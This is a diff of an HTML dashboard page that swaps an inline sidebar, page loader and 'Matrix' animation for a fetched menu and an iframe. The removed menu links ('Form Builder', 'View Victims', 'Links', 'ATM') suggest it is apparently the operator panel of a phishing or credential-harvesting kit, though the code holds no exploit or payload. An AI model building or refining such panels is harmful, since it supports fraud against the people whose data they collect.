@@ -14,67 +14,6 @@
       overflow: hidden;
     }
 
-    /* Matrix background */
-    #matrix {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      z-index: -1;
-      background: black;
-    }
-
-    /* Sidebar */
-    #sidebar {
-      position: fixed;
-      top: 0;
-      left: -260px;
-      width: 260px;
-      height: 100%;
-      background: linear-gradient(180deg, #000 0%, #001a00 100%);
-      border-right: 2px solid lime;
-      transition: left 0.3s ease-in-out;
-      padding-top: 60px;
-      z-index: 2000;
-      box-shadow: 4px 0 15px rgba(0,255,0,0.3);
-      overflow-y: auto;
-    }
-    #sidebar.active { left: 0; }
-
-    #sidebar h2 {
-      color: #0f0;
-      text-align: center;
-      margin: 0 0 20px;
-      font-size: 22px;
-      letter-spacing: 1px;
-    }
-
-    #sidebar a {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 14px 20px;
-      color: #0f0;
-      font-weight: bold;
-      text-decoration: none;
-      border-bottom: 1px solid #003300;
-      transition: background 0.2s, color 0.2s;
-    }
-    #sidebar a:hover {
-      background: #003300;
-      color: #fff;
-    }
-
-    #sidebar a.logout {
-      color: red;
-      border-top: 2px solid #003300;
-      margin-top: 20px;
-    }
-    #sidebar a.logout:hover {
-      background: #330000;
-      color: #fff;
-    }
-
-    /* Toggle button */
     #menuToggle {
       position: fixed;
       top: 15px;
@@ -91,82 +30,57 @@
     }
     #menuToggle:hover { background: #00cc00; }
 
-    /* Main content area */
-    #content {
-      margin-left: 0;
-      padding: 20px;
-      width: 100%;
+    #sidebar {
+      position: fixed;
+      top: 0;
+      left: -260px; 
+      width: 260px;
       height: 100%;
-      overflow-y: auto;
-      background: rgba(0,0,0,0.85);
-      z-index: 1000;
-      transition: margin-left 0.3s ease;
+      background: linear-gradient(180deg, #000 0%, #001a00 100%);
+      border-right: 2px solid lime;
+      transition: left 0.3s ease-in-out;
+      padding-top: 60px;
+      z-index: 2000;
+      box-shadow: 4px 0 15px rgba(0,255,0,0.3);
     }
-    #sidebar.active ~ #content { margin-left: 260px; }
+    #sidebar.active { left: 0; }
+
+    #content {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      overflow: auto;
+    }
   </style>
 </head>
 <body>
 
-  <!-- Matrix background -->
-  <canvas id="matrix"></canvas>
-
-  <!-- Sidebar toggle button -->
+  <!-- Menu Toggle -->
   <div id="menuToggle" onclick="toggleMenu()">☰</div>
 
-  <!-- User Sidebar menu -->
-  <div id="sidebar">
-    <h2>⚡ User Panel</h2>
-    <a href="#" onclick="loadPage('home.html')">🏠 Home</a>
-    <a href="#" onclick="loadPage('form-builder.html')">📝 Form Builder</a>
-    <a href="#" onclick="loadPage('victims.html')">👀 View Victims</a>
-    <a href="#" onclick="loadPage('links.html')">🔗 Links</a>
-    <a href="#" onclick="loadPage('atm.html')">🏦 ATM</a>
-    <a href="#" onclick="logout()" class="logout">🚪 Logout</a>
-  </div>
+  <!-- User Menu -->
+  <div id="sidebar"></div>
 
-  <!-- Main content area -->
+  <!-- Main Content -->
   <div id="content">
-    <!-- Home / Emergency messages will appear here -->
+    <iframe id="dashboardFrame" src="home.html" style="width:100%; height:100%; border:none;"></iframe>
   </div>
 
   <script>
     const sidebar = document.getElementById("sidebar");
-    const content = document.getElementById("content");
+    const menuToggle = document.getElementById("menuToggle");
 
     function toggleMenu() {
       sidebar.classList.toggle("active");
     }
 
-    async function loadPage(file) {
+    async function loadMenu() {
       try {
-        const res = await fetch(file + "?_=" + Date.now());
-        let html = await res.text();
-
-        // If home.html, load emergency box
-        if(file === "home.html") {
-          const parser = new DOMParser();
-          const doc = parser.parseFromString(html, "text/html");
-          content.innerHTML = html;
-
-          // Load emergency messages from separate file for real-time updates
-          async function loadEmergency() {
-            try {
-              const emRes = await fetch("emergency.html?_=" + Date.now());
-              const emHtml = await emRes.text();
-              const emergencyBox = content.querySelector("#emergencyBox");
-              if(emergencyBox) emergencyBox.innerHTML = emHtml;
-            } catch {
-              const emergencyBox = content.querySelector("#emergencyBox");
-              if(emergencyBox) emergencyBox.innerHTML = "🚨 Emergency message could not be loaded.";
-            }
-          }
-          loadEmergency();
-          setInterval(loadEmergency, 10000);
-        } else {
-          content.innerHTML = html;
-        }
+        const response = await fetch("user-menu.html");
+        const html = await response.text();
+        sidebar.innerHTML = html;
       } catch (err) {
-        content.innerHTML = "<p style='color:red'>Error loading " + file + "</p>";
+        sidebar.innerHTML = "<p style='color:red'>Error loading menu</p>";
       }
     }
 
@@ -176,33 +90,8 @@
       window.location.href = "user-login.html";
     }
 
-    // Load default home page
-    loadPage("home.html");
-
-    // Matrix animation
-    const canvas = document.getElementById("matrix");
-    const ctx = canvas.getContext("2d");
-    canvas.height = window.innerHeight;
-    canvas.width = window.innerWidth;
-    const letters = "01";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-
-    function drawMatrix() {
-      ctx.fillStyle = "rgba(0,0,0,0.05)";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "#0F0";
-      ctx.font = fontSize + "px monospace";
-
-      for (let i = 0; i < drops.length; i++) {
-        const text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
-        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-      }
-    }
-    setInterval(drawMatrix, 50);
+    loadMenu();
   </script>
+
 </body>
 </html>
